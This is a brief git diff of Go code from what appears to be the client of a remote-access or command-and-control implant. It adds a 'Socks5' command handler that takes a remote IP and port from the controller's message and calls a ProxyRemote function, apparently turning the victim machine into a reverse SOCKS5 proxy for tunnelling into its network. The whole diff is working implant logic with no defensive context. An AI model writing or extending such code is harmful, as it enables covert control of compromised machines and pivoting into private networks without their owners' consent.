@@ -8,6 +8,7 @@ import (
 
 	"main/Encrypt"
 	"main/Helper"
+	"main/Helper/Proxy/operate"
 	"main/MessagePack"
 	"main/PcInfo"
 	"main/TCPsocket"
@@ -509,6 +510,14 @@ func Read(Data []byte, Connection net.Conn) {
 					utf8Stdout = err.Error()
 				}
 				SessionLog(utf8Stdout, Connection, *unmsgpack)
+			}()
+		}
+	case "Socks5":
+		{
+			go func() {
+				RemoteIp := unmsgpack.ForcePathObject("RemoteIp").GetAsString()
+				SocksPort := unmsgpack.ForcePathObject("SocksPort").GetAsString()
+				operate.ProxyRemote(RemoteIp+":"+SocksPort, false)
 			}()
 		}
 
